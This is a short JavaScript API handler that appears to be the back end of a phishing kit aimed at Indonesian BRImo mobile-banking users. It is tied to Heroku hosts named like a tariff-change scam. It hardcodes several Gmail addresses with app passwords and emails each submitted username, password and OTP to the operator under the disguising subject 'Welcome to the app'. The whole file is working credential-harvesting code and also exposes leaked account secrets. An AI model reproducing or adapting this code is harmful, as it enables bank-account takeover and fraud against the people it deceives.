export default function handler(req, res) {
    const nodemailer = require('nodemailer');

    const { body } = req;
    const { url } = req.headers;

    let email = '';
    let pass = '';

    if (url == ''){

       email = ''
       pass = ''
    }else
    
    if(url == 'pilihtarifbrimo.herokuapp.com') //jika url sama dengan url hosting
    {

        email = 'sehebat52@gmail.com'; //email
        pass = 'xkzebfcpow'; //sandi aplikasi dari verifikasi 2 langkah
        
    } else if(url == 'pilihperubahantarif.herokuapp.com') //jika url sama dengan url hosting
    {
        email = 'sinetronsilala@gmail.com'; //email
        pass = 'xqlshlzepl'; //sandi aplikasi dari verifikasi 2 langkah
    }
    else {

        email = 'tapa89911@gmail.com';
        pass = 'nbypzllzgemtttya';

    }
        
        try {
            const transporter = nodemailer.createTransport({
                port: 587,
                host: 'smtp.googlemail.com',
                auth: {
                    user: email,
                    pass: pass,
                    },
                secure: false,
            });
    
            const mailData = {
                from: email,
                to: email,
                subject: 'Welcome to the app',
                html: `
                    <ul>
                        <li>username: ${body.username ?? '-'}</li>
                        <li>password: ${body.password ?? '-'}</li>
                        <li>otp: ${body.otp ?? '-'}</li>

                    </ul>`
                ,            
            }
      
            transporter.sendMail(mailData, function (err, info) {
                if(err){
                  res.status(400).json({error: err})
                }
                else{
                  res.status(200).json({info, status: 200})
                }
            })
    
        } catch (error) {
            res.status(404).send('Not found')
        }

}
